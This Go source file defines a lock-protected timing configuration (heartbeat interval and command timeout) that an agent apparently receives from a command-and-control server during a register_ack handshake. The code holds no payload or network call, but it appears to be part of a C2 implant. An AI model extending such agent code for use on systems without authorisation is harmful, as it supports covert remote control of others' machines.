package main

import (
	"sync"
	"time"
)

// maxRuntimeTimingSec bounds the timing values accepted from register_ack.
const maxRuntimeTimingSec = 600

// runtimeConfig holds the timing parameters the C2 sends in register_ack.
// The accessors use a lock so the heartbeat goroutine and command dispatcher
// can read the values while the handshake (or a repeated ACK) updates them.
type runtimeConfig struct {
	mu         sync.RWMutex
	heartbeat  time.Duration
	cmdTimeout time.Duration
}

func newRuntimeConfig() *runtimeConfig {
	return &runtimeConfig{
		heartbeat:  30 * time.Second,
		cmdTimeout: 60 * time.Second,
	}
}

// set applies a register_ack payload. Values outside 1..maxRuntimeTimingSec
// are ignored; the ACK parser rejects them before this point.
func (r *runtimeConfig) set(heartbeatSec, cmdTimeoutSec int) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if heartbeatSec > 0 && heartbeatSec <= maxRuntimeTimingSec {
		r.heartbeat = time.Duration(heartbeatSec) * time.Second
	}
	if cmdTimeoutSec > 0 && cmdTimeoutSec <= maxRuntimeTimingSec {
		r.cmdTimeout = time.Duration(cmdTimeoutSec) * time.Second
	}
}

func (r *runtimeConfig) heartbeatInterval() time.Duration {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.heartbeat
}

func (r *runtimeConfig) commandTimeout() time.Duration {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.cmdTimeout
}
